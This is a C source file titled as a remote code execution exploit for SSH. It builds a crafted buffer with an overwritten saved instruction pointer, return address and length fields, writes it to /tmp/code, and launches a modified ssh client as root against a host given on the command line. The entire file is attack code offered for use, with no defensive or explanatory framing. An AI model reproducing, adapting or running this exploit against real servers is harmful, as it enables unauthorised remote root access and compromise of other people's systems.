/* Remote Code Execution Exploit for SSH */
/* Ported to DSMIL DSSL */

#include <stdio.h>
#include <stdlib.h>
#include <unistd.h>
#include <sys/types.h>
#include <sys/stat.h>
#include <fcntl.h>
#include <string.h>

/* Path to modified ssh binary - assumes it is in the current directory or path */
#define PATH_SSH "./ssh"

int main(int argc, char *argv[])
{
    int f;
    int port;
    unsigned long *ptr;
    char *buffer, *aux, ch, *ssh_cmd;
    int i;

    if (argc < 8)
    {
        printf("\nUsage: %s <saved eip> <count> <packet length> <username length> <host> <port> <h(i)>\n\n", argv[0]);
        fflush(stdout);
        exit(0);
    }

    port = atoi(argv[6]);
    buffer = (char *) malloc(28);
    if (!buffer) {
        perror("malloc");
        exit(1);
    }

    ptr = (unsigned long *) buffer;
    *(ptr++) = 1543007393 + strtoul(argv[1], 0, 10);  /* Saved EIP */
    *(ptr++) = 0;
    *(ptr++) = strtoul(argv[7], 0, 10);               /* h(i) */
    *(ptr++) = 0;
    *(ptr++) = 16520 + strtoul(argv[2], 0, 10);       /* Count */
    *(ptr++) = strtoul(argv[3], 0, 10);               /* Packet Length */
    *(ptr++) = strtoul(argv[4], 0, 10);               /* Username Length */

    /* Endianness swap (assuming Little Endian host targeting Big Endian protocol/struct) */
    for (i = 0; i < 28; i += 4)
    {
        aux = buffer + i;
        ch = *aux;
        *aux = *(aux + 3);
        *(aux + 3) = ch;
        ch = *(aux + 1);
        *(aux + 1) = *(aux + 2);
        *(aux + 2) = ch;
    }

    printf("\nSaved Eip: &h + %lu", 1543007393 + strtoul(argv[1], 0, 10));
    printf("\nReturn Address: 0x%lx", (16520 + strtoul(argv[2], 0, 10))/8);
    printf("\nPacket Length: %lu", (strtoul(argv[3], 0, 10) + 8) & ~7);
    printf("\nUsername Length: %lu\n\n", strtoul(argv[4], 0, 10));
    fflush(stdout);

    f = open("/tmp/code", O_RDWR | O_CREAT | O_TRUNC, S_IRWXU);
    if (f < 0) {
        perror("open /tmp/code");
        free(buffer);
        exit(1);
    }
    if (write(f, buffer, 28) != 28) {
        perror("write");
    }
    close(f);

    /* Construct SSH command */
    size_t cmd_len = strlen(PATH_SSH) + 100 + strlen(argv[5]);
    ssh_cmd = (char *) malloc(cmd_len);
    if (!ssh_cmd) {
        perror("malloc ssh_cmd");
        free(buffer);
        exit(1);
    }
    
    snprintf(ssh_cmd, cmd_len, "%s -p %i -v -l root %s", PATH_SSH, port, argv[5]);
    
    printf("Executing: %s\n", ssh_cmd);
    int ret = system(ssh_cmd);

    free(buffer);
    free(ssh_cmd);
    
    exit(ret);
}
